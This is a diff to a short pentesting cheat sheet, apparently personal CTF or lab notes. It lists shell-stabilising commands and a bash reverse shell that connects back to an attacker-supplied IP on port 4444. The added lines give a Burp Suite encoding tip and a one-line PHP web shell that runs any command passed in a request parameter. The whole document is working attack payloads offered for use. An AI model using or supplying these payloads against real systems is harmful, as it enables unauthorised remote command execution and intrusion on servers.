@@ -1,6 +1,11 @@
+*Note: use shift+u to url encode these scripts into burp suite
 Stable Shells:
     - " python -c 'import pty;pty.spawn("/bin/bash");' "
     - " SHELL=/bin/bash script -q /dev/null "
 Bash Reverse Shell:
     - ' bash -c 'bash -i >& /dev/tcp/<your_ip>/4444 0>&1 '
  
+PHP Web Shells through system requests
+    Edit a php file and add this to the top:
+        - <?php system($_REQUEST['dirtydog']); ?>
+    Then send a request with <URL>?dirtydog=<command you want to run on server>
